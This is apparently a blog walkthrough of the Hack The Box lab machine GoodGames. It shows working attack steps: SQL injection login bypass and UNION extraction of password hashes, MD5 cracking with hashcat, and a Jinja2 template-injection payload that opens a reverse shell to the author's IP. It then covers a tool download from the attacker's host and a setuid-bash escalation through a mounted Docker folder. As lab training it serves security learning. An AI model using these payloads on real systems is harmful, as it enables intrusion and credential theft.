---
layout: post
title: Hack The Box Walkthrough - GoodGames
date: 2022-03-11
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/04/HTB/GoodGames
img: 2022/03/GoodGames/GoodGames.png
---

In this box, I got to exploit some SQL Injection, Server Side Template Injection, and some Docker misconfiguration. It took me a while to exploit it. And I really enjoyed how I needed to take steps back twice to be able to move further.

* Room: GoodGames
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/GoodGames](https://app.hackthebox.com/machines/GoodGames)
* Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Enumeration

I launched the machine, added its IP to my hosts file, and looked for opened ports.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.96.71:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
```

Only the port 80 (HTTP) is opened. So I launched dirb to check for hidden files and folders while I looked at the web site.

```bash
$ dirb http://target.htb/ /usr/share/dirb/wordlists/common.txt -o dirb.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.txt
START_TIME: Fri Mar 11 11:50:52 2022
URL_BASE: http://target.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://target.htb/ ----
+ http://target.htb/blog (CODE:200|SIZE:44212)
+ http://target.htb/forgot-password (CODE:200|SIZE:32744)
+ http://target.htb/login (CODE:200|SIZE:9294)
+ http://target.htb/logout (CODE:302|SIZE:208)
+ http://target.htb/profile (CODE:200|SIZE:9267)
+ http://target.htb/server-status (CODE:403|SIZE:275)
+ http://target.htb/signup (CODE:200|SIZE:33387)

-----------------
END_TIME: Fri Mar 11 11:54:45 2022
DOWNLOADED: 4612 - FOUND: 7
```

## Web Site

![Web Site](/assets/images/2022/03/GoodGames/WebSite.png "Web Site")

I looked around the web site for a while. Most of the links didn't work. I went to the blog, and only one post linked to something (http://target.htb/blog/1).

![Blog Post](/assets/images/2022/03/GoodGames/BlogPost.png "Blog Post")

I tried changing the 1 in the URL to perform [SQL Injection](https://portswigger.net/web-security/sql-injection) or [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/). Being the only post that lead somewhere, I was sure the exploit was in there. But I couldn't exploit it.

Next I tried to login and saw that I could create an account. 

![Signup](/assets/images/2022/03/GoodGames/Signup.png "Signup")

I created an account and used it to login. It showed a welcome message before redirecting me to a profile page.

![Profile](/assets/images/2022/03/GoodGames/Profile.png "Profile")

I couldn't edit anything on my profile. I tried changing my password. But it gave me a 500. I spent some time trying to modify the change password request in Burp, but that was another dead end. I went back to the blog page to see if anything would be different now that I was logged in, but everything was the same as before.

After a while, I went back to the login page and tried SQL Injection. 

![SQLi](/assets/images/2022/03/GoodGames/sqli.png "SQLi")

I tried the simplest injection "' or 1 = 1 -- -" and it worked on the first attempt. 

![Admin Logged In](/assets/images/2022/03/GoodGames/AdminLoggedIn.png "Admin Logged In")


## Internal Administration Site

Once logged in, the site was the same as with a non admin user. Except there was a new link at the top. 

![New Link](/assets/images/2022/03/GoodGames/NewLink.png "New Link")

Clicking on it sent me to 'http://internal-administration.goodgames.htb/'. I added it to my hosts file and reloaded the page. It gave my another login screen. 

![Administration Login Screen](/assets/images/2022/03/GoodGames/AdmininstrationLoginScreen.png "Administration Login Screen")

I made multiple attempt at SQL Injection on that page. I also tried to brute force the loging using admin and admin@goodgames.htb as usernames. But nothing worked. 

It took me some time before I realised that I could go back to the original SQL Injection and use it for more than login as admin. I did a login attempt, then used Burp Repeater to start experimenting with the injection.

First, I tried to find out how may columns were returned by the query. 

```http
POST /login HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://target.htb
Connection: close
Referer: http://target.htb/
Upgrade-Insecure-Requests: 1

email=' Or 1 = 1 Order by 1 -- -- &password=sfdkljds
```

Resulted in:

```html
<h2 class="h4">Welcome admin</h2>
```

I incremented the column to order by until it failed at `Order by 5`. With this, I knew that the query needed to return 4 columns.

Next I needed to find wich column was used as the username that was displayed on the page. 

```http
email=' Union Select 1, 2, 3, 4 -- -- &password=sfdkljds
```
```html
<h2 class="h4">Welcome 4</h2>
```

The fourth column contained the username and was displayed on the page. I could use this to extract any data I wanted from the database.

Get the database name. 

```
email=' Union Select 1, 2, 3, database() -- -- &password=sfdkljds

Welcome main
```

Get the tables in the main database.

```
email=' Union Select 1, 2, 3, GROUP_CONCAT(TABLE_NAME) From information_schema.TABLES Where TABLE_SCHEMA = 'main' -- -- &password=sfdkljds

Welcome blog,blog_comments,user
```

Get the columns in the user table. 
```
email=' Union Select 1, 2, 3, GROUP_CONCAT(COLUMN_NAME) From information_schema.COLUMNS Where TABLE_SCHEMA = 'main' And TABLE_NAME = 'user' -- -- &password=sfdkljds

Welcome id,email,password,name
```

Read the user table.
```
email=' Union Select 1, 2, 3, CONCAT(id, '-', name, '-', email, '-', password) From user Order By 1 Limit 0, 1 -- -- &password=sfdkljds

Welcome 1-admin-admin@goodgames.htb-2b22337f218b2d82dfc3b6f77e7cb8ec
```

I had the MD5 hash of the admin password. I launched hashcat to crack it. 

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/wordlists/rockyou.txt         
hashcat (v6.2.5) starting       
                                                                                                                     
OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, skipped
                                                          
OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD Ryzen 7 PRO 5850U with Radeon Graphics, 1932/3929 MB (491 MB allocatable), 4MCU
                                                          
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
                                                          
Hashes: 1 digests; 1 unique digests, 1 unique salts 
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

2b22337f218b2d82dfc3b6f77e7cb8ec:REDACTED
                                                           
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 2b22337f218b2d82dfc3b6f77e7cb8ec
Time.Started.....: Mon Mar  7 20:54:07 2022 (1 sec)
Time.Estimated...: Mon Mar  7 20:54:08 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) 
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  4565.9 kH/s (0.07ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3476480/14344385 (24.24%)
Rejected.........: 0/3476480 (0.00%)
Restore.Point....: 3475456/14344385 (24.23%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: supercecy01 -> super713!
Hardware.Mon.#2..: Util: 42%

Started: Mon Mar  7 20:54:05 2022
Stopped: Mon Mar  7 20:54:09 2022
```

I used the found password to login the administration portal.

![Administration Dashboard](/assets/images/2022/03/GoodGames/AdminDashboard.png "Administration Dashboard")

I looked around the administration portal until I got to the profile page. 

![Admin Profile](/assets/images/2022/03/GoodGames/AdminProfile.png "Admin Profile")

I tried using [Server Side Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) (SSTI) on the full name field. I entered {% raw %}`{{ 7 * 7 }}`{% endraw %} to see if the code would be executed. 

![SSTI](/assets/images/2022/03/GoodGames/SSTI.png "SSTI")

It worked! I followed the [flow from HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) to identify the template engine. Jinja2 was used. 

Next I started a netcat listener on my machine and tried to launch a reverse shell. 


{% raw %}
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```
{% endraw %}

This got me a hit on my listener. 

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444

Connection received on 10.129.146.71 52176
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

# ls
Dockerfile
project
requirements.txt
```

## Lateral movement

Once I had a shell, I first solidified it. Then I stated looking around the machine. I was root on the machine. But it was quickly clear that I was in a Docker container. 

I wanted to look for other machines that were accessible from the one I was in. I starter a web server in my Kali VM and copied ncat in the webroot. 

```bash
$ cd www/

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then I used curl in the container to download nmap.

```bash
root@3a453ab39d3d:/tmp# curl 10.10.14.23:8000/nmap -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   823k      0  0:00:07  0:00:07 --:--:--  828k

root@3a453ab39d3d:/tmp# chmod +x nmap 

root@3a453ab39d3d:/tmp# ./nmap 172.19.0.2/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-11 20:39 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000025s latency).
Not shown: 1205 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:BC:7C:EC:D5 (Unknown)

Nmap scan report for 3a453ab39d3d (172.19.0.2)
Host is up (0.000025s latency).
All 1207 scanned ports on 3a453ab39d3d (172.19.0.2) are closed

Nmap done: 256 IP addresses (2 hosts up) scanned in 19.68 seconds
root@3a453ab39d3d:/tmp# 
```

It found a machine on `172.19.0.1` with 22 (SSH) and 80 (HTTP) opened. I used curl to get the website. It was the first site I found on the box. I tried to SSH to the box using the password I had found, but it failed. 

I started looking around the box for usernames and password. I found some potential passwords in the website code. But none of them worked when I tried to SSH to the other box. 

I looked at the `/etc/passwd` for other usernames, but it did not contains any. I kept enumerating the machine. I tried running LinPEAS in it even if I was already root. Eventually, I listed `/home` and it contained a user's folder, even it the machine did not have the corresponding user.

```
root@3a453ab39d3d:/tmp# ls /home/
augustus

root@3a453ab39d3d:/tmp# ls -la /home/augustus/
total 24
drwxr-xr-x 2 1000 1000 4096 Nov  3 10:16 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 1000 1000   33 Mar 11 19:34 user.txt

root@3a453ab39d3d:/tmp# cat /home/augustus/user.txt 
REDACTED
```

I had the first flag, and a username. I tried SSH with that new username and the passwords I had found. The admin password I found with the SQL Injection worked. 

```bash
root@3a453ab39d3d:/tmp# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ 
```

## Getting root

This one took me way too long. I tried `sudo -l`, but sudo was not present on the box. I looked around for cron jobs and files with suid set. But I did not find anything. I tried listing Docker images, but the user did not have the permission to use Docker. I tried all the password found previously, and another one I found in the website code to su as root. They all failed. I looked in the database on the box, but it only contained the user's password I already had. 

I copied LinPEAS in my web server and tried running it on the box. I went through all the findings 3 times and did not find anything I could exploit.

Eventually, I remembered the `augustus` folder in the Docker container. This should not have been there. It contained the same flag.txt file that was also on the main box. I checked if the folder was mounted in the container by adding a file and verifying if it was in the container.

```
augustus@GoodGames:~$ pwd
/home/augustus

augustus@GoodGames:~$ touch test

augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.

root@3a453ab39d3d:/tmp# ls -l /home/augustus/
total 4
-rw-r--r-- 1 1000 1000  0 Mar 11 20:58 test
-rw-r----- 1 1000 1000 33 Mar 11 19:34 user.txt
```

The file was there. Since the container ran as root, I could copy a file in the home folder, then go back to the container and changed it's permission. I used that to copy bash in my home folder in the main box. In the container, I could change it's owner to root and set the suid bit. This way, it would be executed as root in the box. 

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 11 21:06:08 2022 from 172.19.0.2

augustus@GoodGames:~$ pwd
/home/augustus

augustus@GoodGames:~$ cp /bin/bash .

augustus@GoodGames:~$ ls -l
total 1148
-rwxr-xr-x 1 augustus augustus 1168776 Mar 11 21:08 bash
-rw-r--r-- 1 augustus augustus       0 Mar 11 20:58 test
-rw-r----- 1 augustus augustus      33 Mar 11 19:34 user.txt

augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.

root@3a453ab39d3d:/home/augustus# cd /home/augustus/

root@3a453ab39d3d:/home/augustus# ls -l
total 1148
-rwxr-xr-x 1 1000 1000 1168776 Mar 11 21:08 bash
-rw-r--r-- 1 1000 1000       0 Mar 11 20:58 test
-rw-r----- 1 1000 1000      33 Mar 11 19:34 user.txt

root@3a453ab39d3d:/home/augustus# chown root:root bash 

root@3a453ab39d3d:/home/augustus# chmod 4777 bash 

root@3a453ab39d3d:/home/augustus# ls -l
total 1148
-rwsrwxrwx 1 root root 1168776 Mar 11 21:08 bash
-rw-r--r-- 1 1000 1000       0 Mar 11 20:58 test
-rw-r----- 1 1000 1000      33 Mar 11 19:34 user.txt

root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 11 21:07:51 2022 from 172.19.0.2

augustus@GoodGames:~$ ls -l
total 1148
-rwsrwxrwx 1 root     root     1168776 Mar 11 21:08 bash
-rw-r--r-- 1 augustus augustus       0 Mar 11 20:58 test
-rw-r----- 1 augustus augustus      33 Mar 11 19:34 user.txt

augustus@GoodGames:~$ ./bash -p

bash-5.0# whoami
root

bash-5.0# cat /root/root.txt 
REDACTED
```